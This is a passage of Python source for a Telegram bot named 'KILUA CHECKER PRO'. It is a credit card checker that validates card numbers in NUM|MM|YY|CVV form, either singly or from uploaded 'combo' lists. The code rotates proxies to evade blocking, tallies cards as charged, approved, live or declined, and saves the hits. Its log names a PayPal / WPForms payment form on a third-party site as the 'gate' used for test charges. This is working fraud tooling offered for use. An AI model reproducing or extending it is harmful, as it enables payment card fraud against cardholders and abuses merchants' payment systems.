    bot.reply_to(msg, "<b>📊 Status</b>", parse_mode="HTML", reply_markup=mk)


@bot.message_handler(commands=["proxy"])
def h_proxy(msg):
    uid  = msg.from_user.id
    text = msg.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(msg,
            "Usage: <code>/proxy host:port:user:pass</code>\n"
            "or: <code>/proxy host:port</code>",
            parse_mode="HTML")
        return
    proxy_mgr.set_single(parts[1].strip())
    bot.reply_to(msg, f"✅ Proxy set: <code>{parts[1].strip()}</code>",
                 parse_mode="HTML", reply_markup=kb_home())


# ── Manual /chk ───────────────────────────────────────

@bot.message_handler(commands=["chk"])
def h_chk(msg):
    uid   = msg.from_user.id
    text  = msg.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(msg, "❌ Usage: <code>/chk NUM|MM|YY|CVV</code>",
                     parse_mode="HTML")
        return

    cc   = parts[1].strip()
    prog = bot.reply_to(msg,
        f"🔄 <b>Checking...</b>\n<code>{mask(cc)}</code>",
        parse_mode="HTML")

    def _do():
        status, msg_r, elapsed = check_card(cc)
        if is_hit(status):
            save_result(uid, status.lower(), cc)
        try:
            _t, _mk = kb_result(cc, status, msg_r, elapsed)
            bot.edit_message_text(_t, prog.chat.id, prog.message_id,
                                  parse_mode="HTML", reply_markup=_mk)
        except Exception:
            pass

    threading.Thread(target=_do, daemon=True).start()


# ── Combo + Proxy file ────────────────────────────────

@bot.message_handler(content_types=["document"])
def h_doc(msg):
    uid = msg.from_user.id
    doc = msg.document
    if not doc:
        return

    fname = doc.file_name.lower()

    # ── ملف بروكسي ──────────────────────────────────
    if "proxy" in fname or fname.endswith(".proxy"):
        prog = bot.send_message(msg.chat.id, "🔄 Loading proxies...",
                                parse_mode="HTML")
        try:
            fi  = bot.get_file(doc.file_id)
            raw = bot.download_file(fi.file_path)
            tmp = Path(f"results/{uid}_proxies.txt")
            tmp.write_bytes(raw)
            proxy_mgr.load_file(str(tmp))
            bot.edit_message_text(
                f"✅ Loaded <b>{len(proxy_mgr._list)}</b> proxies.",
                msg.chat.id, prog.message_id, parse_mode="HTML",
                reply_markup=kb_home())
        except Exception as e:
            bot.edit_message_text(f"❌ {e}", msg.chat.id, prog.message_id,
                                  parse_mode="HTML")
        return

    # ── ملف كومبو ────────────────────────────────────
    if not fname.endswith(".txt"):
        bot.reply_to(msg, "❌ Send a <code>.txt</code> file.", parse_mode="HTML")
        return

    if gs(uid).get("running"):
        bot.reply_to(msg, "⚠️ Stop current check first: /stop", parse_mode="HTML")
        return

    prog = bot.send_message(msg.chat.id, "🔄 <b>Loading combo...</b>",
                             parse_mode="HTML")
    try:
        fi   = bot.get_file(doc.file_id)
        raw  = bot.download_file(fi.file_path)
        lines = [l.strip() for l in
                 raw.decode("utf-8", errors="ignore").splitlines()
                 if l.strip() and "|" in l]
    except Exception as e:
        bot.edit_message_text(f"❌ Failed: <code>{e}</code>",
                              msg.chat.id, prog.message_id, parse_mode="HTML")
        return

    if not lines:
        bot.edit_message_text("❌ No valid cards found.",
                              msg.chat.id, prog.message_id, parse_mode="HTML")
        return

    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton(
        f"📦  {len(lines)} cards  —  Starting...",
        callback_data="ignore", style="primary",
        icon_custom_emoji_id=I["stars"],
    ))
    mk.add(InlineKeyboardButton(
        "𝐒𝐭𝐨𝐩", callback_data="stop",
        style="danger", icon_custom_emoji_id=I["stop"],
    ))
    bot.edit_message_text("🔥 <b>KILUA CHECKER PRO</b>",
                          msg.chat.id, prog.message_id,
                          parse_mode="HTML", reply_markup=mk)

    threading.Thread(
        target=_combo_worker,
        args=(uid, msg.chat.id, prog.message_id, lines, 3),
        daemon=True,
    ).start()

# ══════════════════════════════════════════════════════
# CALLBACK HANDLERS
# ══════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda c: c.data == "home")
def cb_home(call):
    uid  = call.from_user.id
    name = call.from_user.first_name or "User"
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_text(txt_welcome(name), call.message.chat.id,
                              call.message.message_id, parse_mode="HTML",
                              reply_markup=kb_main())
    except Exception:
        bot.send_message(call.message.chat.id, txt_welcome(name),
                         parse_mode="HTML", reply_markup=kb_main())


@bot.callback_query_handler(func=lambda c: c.data == "stop")
def cb_stop(call):
    uid = call.from_user.id
    st  = gs(uid)
    if st.get("running"):
        st["running"] = False
        ss(uid, st)
        bot.answer_callback_query(call.id, "🛑 Stopping...", show_alert=False)
    else:
        bot.answer_callback_query(call.id, "No active check.", show_alert=True)


@bot.callback_query_handler(func=lambda c: c.data == "status")
def cb_status(call):
    bot.answer_callback_query(call.id)
    uid = call.from_user.id
    st  = gs(uid)
    if not st:
        bot.send_message(call.message.chat.id, "ℹ️ No active check.",
                         parse_mode="HTML")
        return
    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton(f"💰  {st.get('charged',0)}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["charged"]),
        InlineKeyboardButton(f"✅  {st.get('approved',0)}", callback_data="ignore",
                             style="success", icon_custom_emoji_id=I["approved"]),
    )
    mk.row(
        InlineKeyboardButton(f"🟡  {st.get('live',0)}", callback_data="ignore",
                             style="primary", icon_custom_emoji_id=I["gate"]),
        InlineKeyboardButton(f"❌  {st.get('declined',0)}", callback_data="ignore",
                             style="danger", icon_custom_emoji_id=I["declined"]),
    )
    run = "🟢 Running" if st.get("running") else "🔴 Stopped"
    mk.add(InlineKeyboardButton(f"📦  {st.get('total',0)}  {run}",
                                callback_data="ignore", style="primary",
                                icon_custom_emoji_id=I["stars"]))
    mk.add(InlineKeyboardButton("𝐇𝐨𝐦𝐞", callback_data="home",
                                style="primary", icon_custom_emoji_id=I["back"]))
    bot.send_message(call.message.chat.id, "<b>📊 Status</b>",
                     parse_mode="HTML", reply_markup=mk)


@bot.callback_query_handler(func=lambda c: c.data == "hint_manual")
def cb_hint_m(call):
    bot.answer_callback_query(call.id)
    mk = kb_home()
    bot.send_message(call.message.chat.id,
        "📌 <b>Manual Check</b>\n\n"
        "<code>/chk NUM|MM|YY|CVV</code>\n\n"
        "Example:\n<code>/chk 4111111111111111|08|26|123</code>",
        parse_mode="HTML", reply_markup=mk)


@bot.callback_query_handler(func=lambda c: c.data == "hint_combo")
def cb_hint_c(call):
    bot.answer_callback_query(call.id)
    mk = kb_home()
    bot.send_message(call.message.chat.id,
        "📁 <b>Combo Check</b>\n\n"
        "Send a <code>.txt</code> file\n"
        "Format: <code>NUM|MM|YY|CVV</code>\n\n"
        "📋 To set proxies: send a file with <code>proxy</code> in name\n"
        "Format per line: <code>host:port:user:pass</code>",
        parse_mode="HTML", reply_markup=mk)


@bot.callback_query_handler(func=lambda c: c.data == "set_proxy")
def cb_set_proxy(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
        "🌐 <b>Set Proxy</b>\n\n"
        "Single: <code>/proxy host:port:user:pass</code>\n"
        "List: Send a <code>.txt</code> file named <code>proxy_list.txt</code>",
        parse_mode="HTML", reply_markup=kb_home())


@bot.callback_query_handler(func=lambda c: c.data == "ignore")
def cb_ignore(call):
    bot.answer_callback_query(call.id)

# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════

def main():
    log.info("═"*55)
    log.info(f"  🔥  KILUA CHK PRO v{VERSION} — {TAG}")
    log.info(f"  🎯  Gate: PayPal / WPForms")
    log.info(f"  🌐  Site: {SITE}")
    log.info("═"*55)
    while True:
        try:
            bot.infinity_polling(timeout=30, skip_pending=True,
                                 long_polling_timeout=20)
        except Exception as e:
            log.error(f"Polling: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
